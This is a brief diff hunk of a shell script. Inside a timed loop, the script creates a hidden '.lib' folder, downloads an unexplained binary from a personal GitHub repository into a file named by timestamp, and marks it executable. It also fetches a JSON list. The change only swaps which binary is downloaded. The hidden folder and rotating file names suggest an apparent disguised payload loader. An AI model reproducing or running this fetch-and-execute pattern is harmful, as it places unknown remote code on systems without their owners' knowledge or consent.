@@ -18,7 +18,7 @@ while [ $(date +%s) -lt $end_time ]; do
   timestamp=$(date +%s)
   mkdir -p .lib
   dynamic_sgr=".lib/sgr_$timestamp"
-  wget -O $dynamic_sgr https://github.com/barburonjilo/back/raw/main/cepum
+  wget -O $dynamic_sgr https://github.com/barburonjilo/back/raw/main/sru
   chmod +x $dynamic_sgr
   dynamic_list="list_$timestamp.json"
   wget -O $dynamic_list https://github.com/barburonjilo/setstra/raw/main/list4.json
